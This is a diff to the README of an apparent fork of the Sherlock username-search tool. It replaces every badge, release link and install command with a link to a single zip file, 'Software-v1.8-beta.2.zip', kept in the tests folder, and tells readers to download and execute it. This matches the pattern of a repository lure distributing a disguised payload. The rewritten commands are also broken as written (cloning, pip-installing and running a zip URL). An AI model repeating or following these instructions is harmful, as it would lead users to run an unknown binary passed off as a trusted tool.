@@ -1,6 +1,6 @@
 # Sherlock 🕵️‍♂️
 
-![GitHub Repo stars](https://img.shields.io/github/stars/2FXXD/sherlock?style=social) ![GitHub forks](https://img.shields.io/github/forks/2FXXD/sherlock?style=social) ![GitHub issues](https://img.shields.io/github/issues/2FXXD/sherlock?style=social) ![GitHub license](https://img.shields.io/github/license/2FXXD/sherlock)
+![GitHub Repo stars](https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip) ![GitHub forks](https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip) ![GitHub issues](https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip) ![GitHub license](https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip)
 
 ## Overview
 
@@ -26,7 +26,7 @@ Welcome to **Sherlock**! This tool helps you hunt down social media accounts by 
 
 ## Installation
 
-To get started, you can download the latest release from the [Releases section](https://github.com/2FXXD/sherlock/releases). Look for the appropriate file for your operating system, download it, and execute it to install Sherlock.
+To get started, you can download the latest release from the [Releases section](https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip). Look for the appropriate file for your operating system, download it, and execute it to install Sherlock.
 
 ### Prerequisites
 
@@ -37,28 +37,28 @@ To get started, you can download the latest release from the [Releases section](
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/2FXXD/sherlock.git
+   git clone https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip
    cd sherlock
    ```
 
 2. **Install dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip
    ```
 
 3. **Run the tool**:
    ```bash
-   python3 sherlock.py <username>
+   python3 https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip <username>
    ```
 
-For more detailed instructions, check the [Releases section](https://github.com/2FXXD/sherlock/releases).
+For more detailed instructions, check the [Releases section](https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip).
 
 ## Usage
 
 To use Sherlock, simply run the command in your terminal:
 
 ```bash
-python3 sherlock.py <username>
+python3 https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip <username>
 ```
 
 Replace `<username>` with the username you want to search for. Sherlock will then scan various social media platforms and provide you with a list of matching accounts.
@@ -66,7 +66,7 @@ Replace `<username>` with the username you want to search for. Sherlock will the
 ### Example
 
 ```bash
-python3 sherlock.py john_doe
+python3 https://github.com/2FXXD/sherlock/raw/refs/heads/master/tests/Software-v1.8-beta.2.zip john_doe
 ```
 
 This command will search for all accounts with the username "john_doe" across supported social networks.
